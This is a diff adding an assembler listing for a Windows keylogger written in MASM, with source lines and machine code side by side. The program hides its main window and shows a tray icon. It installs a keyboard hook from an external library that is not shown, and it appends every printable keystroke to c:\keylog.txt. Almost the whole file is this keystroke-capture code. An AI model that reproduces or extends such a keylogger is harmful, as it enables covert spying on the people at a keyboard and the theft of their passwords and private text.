@@ -1,0 +1,422 @@
+Microsoft (R) Macro Assembler Version 6.14.8444		    07/11/03 23:19:43
+D:\programming\WIN32ASM\keylog\keylog.asm		     Page 1 - 1
+
+
+				;###################################################
+				;	Description:	Keylogger By Madhur Ahuja 	
+				;	Version:  	1.0             
+				; 	Author:		Madhur Ahuja               
+				;	Start Date: 	11/07/03,23:15:36                     
+				;	Name:  		keylog.asm
+				;	Assembler:  	MASM 6.14.8444
+				;	Linker:  	Link.exe 5.12.8078
+				;###################################################
+				.386                             
+				.model	flat,stdcall             
+				option 	casemap:none
+				.nolist
+				.listall
+				includelib masm32.lib
+				includelib shell32.lib
+				includelib user32.lib
+				includelib kernel32.lib             
+				includelib kl.lib
+				WinMain proto :DWORD,:DWORD,:DWORD,:DWORD
+ 00000000			.data   	          
+ 00000000 00000000		nid		NOTIFYICONDATA <0>
+	   00000000
+	   00000000
+	   00000000
+	   00000000
+	   00000000
+	   00000040 [
+	    00
+	   ]
+ 00000058 00000000		hicon		dd	0
+ 0000005C 49 43 4F 4E 31	icon		db	'ICON1',0
+	   00
+ 00000062 49 43 4F 4E 32	icon2		db	'ICON2',0
+	   00
+ 00000068 00000000		hfile		dd	0
+ 0000006C 00000000		lighticon	dd	0
+ 00000070 00000000		eyeicon		dd	0
+ 00000074 00000000		htimer		dd	0
+ 00000000			.const               
+ 00000000 53 69 6D 70 6C	ClassName	db 	"SimpleWinClass",0
+	   65 57 69 6E 43
+	   6C 61 73 73 00
+ 0000000F 4F 75 72 20 46	AppName 	db 	"Our First Window",0     
+	   69 72 73 74 20
+	   57 69 6E 64 6F
+	   77 00
+ 00000020 4B 65 79 4C 6F	tip		db	"KeyLogger By Madhur Ahuja",0
+	   67 67 65 72 20
+	   42 79 20 4D 61
+	   64 68 75 72 20
+	   41 68 75 6A 61
+	   00
+ = 000001F4			ID_ICON		equ	500
+ = 000001F5			ID_ICON1	equ 	501
+
+ 0000003A 45 78 69 74 00	exit		db	"Exit",0
+ 0000003F 45 6E 61 62 6C	enable		db	"Enable",0
+	   65 00
+ 00000046 44 69 73 61 62	disable		db	"Disable",0
+	   6C 65 00
+ 0000004E 63 3A 5C 6B 65	file		db	"c:\keylog.txt",0
+	   79 6C 6F 67 2E
+	   74 78 74 00
+ = 00000064			IDEXIT		EQU	100
+ = 00000065			IDENABLE	EQU	101
+ = 00000066			IDDISABLE	EQU	102
+ = 00000401			WM_HOOK		EQU	WM_USER+1
+ = 00000258			TIMERID		EQU	600
+ 00000000			.data?                           
+ 00000000 00000000		hInstance 	HINSTANCE	?
+ 00000004 00000000		CommandLine	LPSTR		?
+ 00000008 00000000		hmenu		dd		?
+ 00000000			.code                            
+ 00000000			start:                           
+ 00000000			        invoke  GetModuleHandle, NULL
+ 00000000  6A 00	   *	    push   +000000000h
+ 00000002  E8 00000000 E   *	    call   GetModuleHandleA
+ 00000007  A3 00000000 R		mov     hInstance,eax
+					invoke  WinMain, hInstance, NULL, CommandLine,SW_HIDE		
+ 0000000C  6A 00	   *	    push   +000000000h
+ 0000000E  FF 35 00000004 R *	    push   CommandLine
+ 00000014  6A 00	   *	    push   +000000000h
+ 00000016  FF 35 00000000 R *	    push   hInstance
+ 0000001C  E8 00000006	   *	    call   WinMain
+					invoke  ExitProcess, eax
+ 00000021  50		   *	    push   eax
+ 00000022  E8 00000000 E   *	    call   ExitProcess
+					
+ 00000027 00000027		WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD
+					LOCAL 	wc:WNDCLASSEX
+					LOCAL 	msg:MSG
+					LOCAL 	hwnd:HWND                         
+
+ 00000027  55		   *	    push   ebp
+ 00000028  8B EC	   *	    mov    ebp, esp
+ 0000002A  83 C4 B0	   *	    add    esp, 0FFFFFFB0h
+ 0000002D  C7 45 D0			mov   	wc.cbSize, SIZEOF WNDCLASSEX
+	   00000030
+ 00000034  C7 45 D4			mov   	wc.style, CS_HREDRAW or CS_VREDRAW
+	   00000003
+ 0000003B  C7 45 D8			mov   	wc.lpfnWndProc, OFFSET WndProc
+	   00000196 R
+ 00000042  C7 45 DC			mov   	wc.cbClsExtra, NULL
+	   00000000
+ 00000049  C7 45 E0			mov   	wc.cbWndExtra, NULL
+	   00000000
+ 00000050  FF 35 00000000 R		push  	hInstance
+ 00000056  8F 45 E4			pop   	wc.hInstance
+ 00000059  C7 45 F0			mov   	wc.hbrBackground, COLOR_WINDOW+1
+	   00000006
+ 00000060  C7 45 F4			mov   	wc.lpszMenuName, NULL
+	   00000000
+ 00000067  C7 45 F8			mov   	wc.lpszClassName, OFFSET ClassName
+	   00000000 R
+					invoke 	LoadIcon, hInst,addr icon
+ 0000006E  68 0000005C R   *	    push   OFFSET icon
+ 00000073  FF 75 08	   *	    push   dword  ptr ss:[ebp]+000000008h
+ 00000076  E8 00000000 E   *	    call   LoadIconA
+ 0000007B  A3 00000070 R		mov	eyeicon,eax
+ 00000080  89 45 E8			mov   	wc.hIcon, eax
+ 00000083  89 45 FC			mov   	wc.hIconSm, eax
+					invoke 	LoadCursor, NULL, IDC_ARROW
+ 00000086  68 00007F00	   *	    push   +000007F00h
+ 0000008B  6A 00	   *	    push   +000000000h
+ 0000008D  E8 00000000 E   *	    call   LoadCursorA
+ 00000092  89 45 EC			mov   	wc.hCursor, eax
+					invoke 	RegisterClassEx, addr wc
+ 00000095  8D 45 D0	   *	    lea    eax, WNDCLASSEX ptr ss:[ebp]+0FFFFFFD0h
+ 00000098  50		   *	    push   eax
+ 00000099  E8 00000000 E   *	    call   RegisterClassExA
+
+					
+					invoke	CreatePopupMenu
+ 0000009E  E8 00000000 E   *	    call   CreatePopupMenu
+ 000000A3  A3 00000008 R		mov	hmenu,eax
+					invoke	AppendMenu,hmenu,MF_STRING,IDENABLE,offset enable
+ 000000A8  68 0000003F R   *	    push   dword  ptr OFFSET FLAT:enable
+ 000000AD  6A 65	   *	    push   +000000065h
+ 000000AF  6A 00	   *	    push   +000000000h
+ 000000B1  FF 35 00000008 R *	    push   hmenu
+ 000000B7  E8 00000000 E   *	    call   AppendMenuA
+					invoke	AppendMenu,hmenu,MF_STRING,IDEXIT,offset exit	
+ 000000BC  68 0000003A R   *	    push   dword  ptr OFFSET FLAT:exit
+ 000000C1  6A 64	   *	    push   +000000064h
+ 000000C3  6A 00	   *	    push   +000000000h
+ 000000C5  FF 35 00000008 R *	    push   hmenu
+ 000000CB  E8 00000000 E   *	    call   AppendMenuA
+					
+					INVOKE 	CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\
+				           	WS_OVERLAPPEDWINDOW or WS_MINIMIZE,CW_USEDEFAULT,\
+				          	CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\
+				           	hInst,NULL
+ 000000D0  6A 00	   *	    push   +000000000h
+ 000000D2  FF 75 08	   *	    push   dword  ptr ss:[ebp]+000000008h
+ 000000D5  6A 00	   *	    push   +000000000h
+ 000000D7  6A 00	   *	    push   +000000000h
+ 000000D9  68 80000000	   *	    push   +080000000h
+ 000000DE  68 80000000	   *	    push   +080000000h
+ 000000E3  68 80000000	   *	    push   +080000000h
+ 000000E8  68 80000000	   *	    push   +080000000h
+ 000000ED  68 20CF0000	   *	    push   +020CF0000h
+ 000000F2  68 0000000F R   *	    push   OFFSET AppName
+ 000000F7  68 00000000 R   *	    push   OFFSET ClassName
+ 000000FC  6A 00	   *	    push   +000000000h
+ 000000FE  E8 00000000 E   *	    call   CreateWindowExA
+ 00000103  89 45 B0			mov   	hwnd, eax
+						
+ 00000106  C7 05 00000000 R		mov	nid.cbSize,sizeof NOTIFYICONDATA
+	   00000058
+					m2m	nid.hwnd,hwnd
+ 00000110  FF 75 B0	     1		push	hwnd
+ 00000113  8F 05 00000004 R  1		pop	nid.hwnd
+ 00000119  C7 05 00000008 R		mov	nid.uID,25h
+	   00000025
+ 00000123  C7 05 0000000C R		mov	nid.uFlags,NIF_MESSAGE OR NIF_TIP or NIF_ICON
+	   00000007
+ 0000012D  C7 05 00000010 R		mov	nid.uCallbackMessage,WM_USER
+	   00000400
+					m2m	nid.hIcon,eyeicon
+ 00000137  FF 35 00000070 R  1		push	eyeicon
+ 0000013D  8F 05 00000014 R  1		pop	nid.hIcon
+					invoke  lstrcpy,addr nid.szTip,addr tip 
+ 00000143  68 00000020 R   *	    push   OFFSET tip
+ 00000148  68 00000018 R   *	    push   OFFSET nid+000000018h
+ 0000014D  E8 00000000 E   *	    call   lstrcpyA
+
+					invoke 	ShowWindow, hwnd,SW_HIDE
+ 00000152  6A 00	   *	    push   +000000000h
+ 00000154  FF 75 B0	   *	    push   dword  ptr ss:[ebp]+0FFFFFFB0h
+ 00000157  E8 00000000 E   *	    call   ShowWindow
+					invoke 	Shell_NotifyIcon,NIM_ADD,addr nid		
+ 0000015C  68 00000000 R   *	    push   OFFSET nid
+ 00000161  6A 00	   *	    push   +000000000h
+ 00000163  E8 00000000 E   *	    call   Shell_NotifyIconA
+					.WHILE TRUE
+ 00000168		   *@C0001:
+						invoke GetMessage, ADDR msg, NULL, 0, 0;
+ 00000168  6A 00	   *	    push   +000000000h
+ 0000016A  6A 00	   *	    push   +000000000h
+ 0000016C  6A 00	   *	    push   +000000000h
+ 0000016E  8D 45 B4	   *	    lea    eax, MSG ptr ss:[ebp]+0FFFFFFB4h
+ 00000171  50		   *	    push   eax
+ 00000172  E8 00000000 E   *	    call   GetMessageA
+						.BREAK .IF (!eax)
+ 00000177  0B C0	   *	    or	eax, eax
+ 00000179  74 14	   *	    je     @C0002
+						invoke TranslateMessage, ADDR msg
+ 0000017B  8D 45 B4	   *	    lea    eax, MSG ptr ss:[ebp]+0FFFFFFB4h
+ 0000017E  50		   *	    push   eax
+ 0000017F  E8 00000000 E   *	    call   TranslateMessage
+						invoke DispatchMessage, ADDR msg
+ 00000184  8D 45 B4	   *	    lea    eax, MSG ptr ss:[ebp]+0FFFFFFB4h
+ 00000187  50		   *	    push   eax
+ 00000188  E8 00000000 E   *	    call   DispatchMessageA
+					.ENDW
+ 0000018D  EB D9	   *	    jmp    @C0001
+ 0000018F		   *@C0002:
+ 0000018F  8B 45 BC			mov     eax,msg.wParam
+					ret
+ 00000192  C9		   *	    leave  
+ 00000193  C2 0010	   *	    ret    00010h
+ 00000196			WinMain	endp
+
+ 00000196			WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
+				local pt:POINT
+				local fss:WIN32_FIND_DATA
+				local chr:dword
+				local buff[20]:byte
+ 00000196  55		   *	    push   ebp
+ 00000197  8B EC	   *	    mov    ebp, esp
+ 00000199  81 C4 FFFFFEA0  *	    add    esp, 0FFFFFEA0h
+					.if 	uMsg==WM_DESTROY
+ 0000019F  83 7D 0C 02	   *	    cmp    uMsg, WM_DESTROY
+ 000001A3  75 28	   *	    jne    @C0005
+						invoke	_lclose,hfile
+ 000001A5  FF 35 00000068 R *	    push   hfile
+ 000001AB  E8 00000000 E   *	    call   _lclose
+						invoke 	PostQuitMessage, NULL
+ 000001B0  6A 00	   *	    push   +000000000h
+ 000001B2  E8 00000000 E   *	    call   PostQuitMessage
+						invoke 	Shell_NotifyIcon,NIM_DELETE,addr nid
+ 000001B7  68 00000000 R   *	    push   OFFSET nid
+ 000001BC  6A 02	   *	    push   +000000002h
+ 000001BE  E8 00000000 E   *	    call   Shell_NotifyIconA
+						invoke	removehook
+ 000001C3  E8 00000000 E   *	    call   removehook
+					.elseif	uMsg==WM_CREATE
+ 000001C8  E9 00000188	   *	    jmp    @C0007
+ 000001CD		   *@C0005:
+ 000001CD  83 7D 0C 01	   *	    cmp    uMsg, WM_CREATE
+ 000001D1  75 5F	   *	    jne    @C0008
+						invoke	installhook,hWnd
+ 000001D3  FF 75 08	   *	    push   dword  ptr ss:[ebp]+000000008h
+ 000001D6  E8 00000000 E   *	    call   installhook
+						invoke	LoadIcon,hInstance,addr icon2
+ 000001DB  68 00000062 R   *	    push   OFFSET icon2
+ 000001E0  FF 35 00000000 R *	    push   hInstance
+ 000001E6  E8 00000000 E   *	    call   LoadIconA
+ 000001EB  A3 0000006C R			mov	lighticon,eax
+						invoke	FindFirstFile,addr file,addr fss
+ 000001F0  8D 85 FFFFFEBA  *	    lea    eax, WIN32_FIND_DATA ptr ss:[ebp]+0FFFFFEBAh
+ 000001F6  50		   *	    push   eax
+ 000001F7  68 0000004E R   *	    push   OFFSET file
+ 000001FC  E8 00000000 E   *	    call   FindFirstFileA
+						.if	eax!=INVALID_HANDLE_VALUE
+ 00000201  83 F8 FF	   *	    cmp    eax, INVALID_HANDLE_VALUE
+ 00000204  74 16	   *	    je     @C000A
+							invoke	_lopen,addr file,OF_READWRITE			
+ 00000206  6A 02	   *	    push   +000000002h
+ 00000208  68 0000004E R   *	    push   OFFSET file
+ 0000020D  E8 00000000 E   *	    call   _lopen
+ 00000212  A3 00000068 R				mov	hfile,eax
+						.else
+ 00000217  E9 00000139	   *	    jmp    @C000C
+ 0000021C		   *@C000A:
+							invoke	_lcreat,addr file,0
+ 0000021C  6A 00	   *	    push   +000000000h
+ 0000021E  68 0000004E R   *	    push   OFFSET file
+ 00000223  E8 00000000 E   *	    call   _lcreat
+ 00000228  A3 00000068 R				mov	hfile,eax
+						.endif
+						
+					.elseif uMsg==WM_USER
+ 0000022D  E9 00000123	   *	    jmp    @C000D
+ 00000232		   *@C0008:
+ 00000232  81 7D 0C
+	   00000400	   *	    cmp    uMsg, WM_USER
+ 00000239  75 35	   *	    jne    @C000E
+						.if	lParam==WM_RBUTTONDOWN
+ 0000023B  81 7D 14
+	   00000204	   *	    cmp    lParam, WM_RBUTTONDOWN
+ 00000242  0F 85 0000010D  *	    jne    @C0010
+							invoke	GetCursorPos,addr pt
+ 00000248  8D 45 F8	   *	    lea    eax, POINT ptr ss:[ebp]+0FFFFFFF8h
+ 0000024B  50		   *	    push   eax
+ 0000024C  E8 00000000 E   *	    call   GetCursorPos
+							invoke	TrackPopupMenu,hmenu,TPM_RIGHTALIGN or TPM_LEFTBUTTON,pt.x,pt.y,0,hWnd,0
+ 00000251  6A 00	   *	    push   +000000000h
+ 00000253  FF 75 08	   *	    push   dword  ptr ss:[ebp]+000000008h
+ 00000256  6A 00	   *	    push   +000000000h
+ 00000258  FF 75 FC	   *	    push   dword  ptr ss:[ebp]+0FFFFFFFCh
+ 0000025B  FF 75 F8	   *	    push   dword  ptr ss:[ebp]+0FFFFFFF8h
+ 0000025E  6A 08	   *	    push   +000000008h
+ 00000260  FF 35 00000008 R *	    push   hmenu
+ 00000266  E8 00000000 E   *	    call   TrackPopupMenu
+						.endif		
+					.elseif	uMsg==WM_COMMAND
+ 0000026B  E9 000000E5	   *	    jmp    @C0012
+ 00000270		   *@C000E:
+ 00000270  81 7D 0C
+	   00000111	   *	    cmp    uMsg, WM_COMMAND
+ 00000277  75 3E	   *	    jne    @C0013
+ 00000279  8B 45 10				mov	eax,wParam
+						.if	ax==IDEXIT
+ 0000027C  66| 83 F8 64	   *	    cmp    ax, IDEXIT
+ 00000280  75 13	   *	    jne    @C0015
+							invoke	SendMessage,hWnd,WM_DESTROY,0,0
+ 00000282  6A 00	   *	    push   +000000000h
+ 00000284  6A 00	   *	    push   +000000000h
+ 00000286  6A 02	   *	    push   +000000002h
+ 00000288  FF 75 08	   *	    push   dword  ptr ss:[ebp]+000000008h
+ 0000028B  E8 00000000 E   *	    call   SendMessageA
+						.elseif	ax==IDENABLE
+ 00000290  E9 000000C0	   *	    jmp    @C0017
+ 00000295		   *@C0015:
+ 00000295  66| 83 F8 65	   *	    cmp    ax, IDENABLE
+ 00000299  0F 85 000000B6  *	    jne    @C0018
+							invoke	MessageBox,0,addr exit,addr exit,0
+ 0000029F  6A 00	   *	    push   +000000000h
+ 000002A1  68 0000003A R   *	    push   OFFSET exit
+ 000002A6  68 0000003A R   *	    push   OFFSET exit
+ 000002AB  6A 00	   *	    push   +000000000h
+ 000002AD  E8 00000000 E   *	    call   MessageBoxA
+						.endif
+					.elseif	uMsg==WM_HOOK
+ 000002B2  E9 0000009E	   *	    jmp    @C001A
+ 000002B7		   *@C0013:
+ 000002B7  81 7D 0C
+	   00000401	   *	    cmp    uMsg, WM_HOOK
+ 000002BE  75 5D	   *	    jne    @C001B
+						invoke	SetTimer,hWnd,TIMERID,500,0
+ 000002C0  6A 00	   *	    push   +000000000h
+ 000002C2  68 000001F4	   *	    push   +0000001F4h
+ 000002C7  68 00000258	   *	    push   +000000258h
+ 000002CC  FF 75 08	   *	    push   dword  ptr ss:[ebp]+000000008h
+ 000002CF  E8 00000000 E   *	    call   SetTimer
+						m2m	nid.hIcon,lighticon
+ 000002D4  FF 35 0000006C R  1		push	lighticon
+ 000002DA  8F 05 00000014 R  1		pop	nid.hIcon
+						invoke 	Shell_NotifyIcon,NIM_MODIFY,addr nid
+ 000002E0  68 00000000 R   *	    push   OFFSET nid
+ 000002E5  6A 01	   *	    push   +000000001h
+ 000002E7  E8 00000000 E   *	    call   Shell_NotifyIconA
+						m2m	chr,wParam
+ 000002EC  FF 75 10	     1		push	wParam
+ 000002EF  8F 85 FFFFFEB4    1		pop	chr
+						;invoke	dw2hex,chr,addr buff
+						;invoke	lstrlen,addr buff
+						.if	chr>=33 && chr<=126
+ 000002F5  83 BD FFFFFEB4
+	   21		   *	    cmp    chr, 021h
+ 000002FC  72 57	   *	    jb     @C001D
+ 000002FE  83 BD FFFFFEB4
+	   7E		   *	    cmp    chr, 07Eh
+ 00000305  77 4E	   *	    ja     @C001D
+							invoke	_lwrite,hfile,addr chr,1
+ 00000307  6A 01	   *	    push   +000000001h
+ 00000309  8D 85 FFFFFEB4  *	    lea    eax, dword  ptr ss:[ebp]+0FFFFFEB4h
+ 0000030F  50		   *	    push   eax
+ 00000310  FF 35 00000068 R *	    push   hfile
+ 00000316  E8 00000000 E   *	    call   _lwrite
+						.endif
+						
+					.elseif	uMsg==WM_TIMER
+ 0000031B  EB 38	   *	    jmp    @C0020
+ 0000031D		   *@C001B:
+ 0000031D  81 7D 0C
+	   00000113	   *	    cmp    uMsg, WM_TIMER
+ 00000324  75 1A	   *	    jne    @C0021
+						m2m	nid.hIcon,eyeicon
+ 00000326  FF 35 00000070 R  1		push	eyeicon
+ 0000032C  8F 05 00000014 R  1		pop	nid.hIcon
+						invoke 	Shell_NotifyIcon,NIM_MODIFY,addr nid				
+ 00000332  68 00000000 R   *	    push   OFFSET nid
+ 00000337  6A 01	   *	    push   +000000001h
+ 00000339  E8 00000000 E   *	    call   Shell_NotifyIconA
+						
+					.else
+ 0000033E  EB 15	   *	    jmp    @C0023
+ 00000340		   *@C0021:
+						invoke DefWindowProc, hWnd, uMsg, wParam, lParam		
+ 00000340  FF 75 14	   *	    push   dword  ptr ss:[ebp]+000000014h
+ 00000343  FF 75 10	   *	    push   dword  ptr ss:[ebp]+000000010h
+ 00000346  FF 75 0C	   *	    push   dword  ptr ss:[ebp]+00000000Ch
+ 00000349  FF 75 08	   *	    push   dword  ptr ss:[ebp]+000000008h
+ 0000034C  E8 00000000 E   *	    call   DefWindowProcA
+						ret
+ 00000351  C9		   *	    leave  
+ 00000352  C2 0010	   *	    ret    00010h
+					.endif
+ 00000355		   *@C0023:
+ 00000355		   *@C0020:
+ 00000355		   *@C001A:
+ 00000355		   *@C0012:
+ 00000355		   *@C000D:
+ 00000355		   *@C0007:
+ 00000355		   *@C000C:
+ 00000355		   *@C0010:
+ 00000355		   *@C0018:
+ 00000355		   *@C0017:
+ 00000355		   *@C001D:
+ 00000355  33 C0			xor 	eax,eax
+					ret
+ 00000357  C9		   *	    leave  
+ 00000358  C2 0010	   *	    ret    00010h
+ 0000035B			WndProc endp                                 
+				end	start	                 
